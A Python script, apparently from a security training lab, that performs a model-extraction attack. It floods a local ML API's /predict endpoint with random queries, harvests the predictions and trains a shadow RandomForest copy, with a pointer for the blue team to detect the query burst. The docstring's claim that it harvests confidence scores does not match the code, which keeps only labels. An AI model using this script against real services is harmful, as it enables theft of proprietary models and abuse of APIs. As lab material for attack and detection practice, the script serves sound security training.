#!/usr/bin/env python3
"""
model_extractor.py — Model Extraction attack (Scenario 08).

Floods a victim ML API's /predict endpoint with random feature vectors, harvests the
leaked confidence scores, and trains a local "shadow model" that mimics the victim.
Demonstrates why returning full-precision probabilities is dangerous.

Target: the lab's ml-api (apps/ml-api), default http://localhost:5005/predict.

Usage:
  python3 model_extractor.py --api http://localhost:5005/predict --queries 5000 \
      --output shadow_model.pkl
"""
import argparse
import pickle

import numpy as np
import requests

N_FEATURES = 10


def harvest(api: str, queries: int) -> tuple:
    X, y = [], []
    rng = np.random.default_rng()
    for i in range(queries):
        feats = rng.random(N_FEATURES).tolist()
        try:
            resp = requests.post(api, json={"features": feats}, timeout=10).json()
        except (requests.RequestException, ValueError):
            continue
        if "prediction" in resp:
            X.append(feats)
            y.append(resp["prediction"])
        if (i + 1) % 500 == 0:
            print(f"  harvested {len(X)}/{i + 1} responses")
    return np.array(X), np.array(y)


def main():
    ap = argparse.ArgumentParser(description="ML model extraction via query harvesting")
    ap.add_argument("--api", default="http://localhost:5005/predict")
    ap.add_argument("--queries", type=int, default=5000)
    ap.add_argument("--output", default="shadow_model.pkl")
    args = ap.parse_args()

    print(f"[*] Harvesting {args.queries} queries from {args.api}")
    X, y = harvest(args.api, args.queries)
    if len(X) < 10:
        print("[!] Too few responses collected — is the ml-api target running?")
        return

    # Train the shadow model on stolen input->label pairs.
    try:
        from sklearn.ensemble import RandomForestClassifier
    except ImportError:
        print("[!] scikit-learn not installed: pip install scikit-learn")
        return
    shadow = RandomForestClassifier(n_estimators=50, random_state=0)
    shadow.fit(X, y)
    acc = shadow.score(X, y)
    with open(args.output, "wb") as f:
        pickle.dump(shadow, f)
    print(f"[+] Shadow model trained on {len(X)} stolen samples "
          f"(self-acc {acc:.3f}) -> {args.output}")
    print("[*] Blue team: detect the burst of uniform /predict queries in Splunk "
          "(see scenario 08 SPL).")


if __name__ == "__main__":
    main()
